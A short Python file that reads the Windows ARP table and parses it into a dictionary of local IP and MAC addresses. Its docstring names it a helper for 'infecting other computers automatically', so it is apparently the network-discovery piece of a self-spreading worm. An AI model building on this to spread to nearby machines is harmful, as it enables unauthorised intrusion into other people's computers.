"""Helper functions for infecting other computers automatically."""

import subprocess
import re


def FormatARPTable():
    connected = subprocess.getoutput(["arp","-a"])
    # uses arp (windows tool) to get all connected devices, but needs checking
    # below this comment is formatting code to format all stuff into list
    formatted = {}
    for line in re.findall('([-.0-9]+)\\s+([-0-9a-f]{17})\\s+(\\w+)',connected):
        # regex from this link on StackOverflow: https://stackoverflow.com/questions/59857314/how-can-i-get-the-arp-table-from-a-windows-machine-using-python
        formatted[line[0]] = line[1],line[2]
    return formatted

print(FormatARPTable())
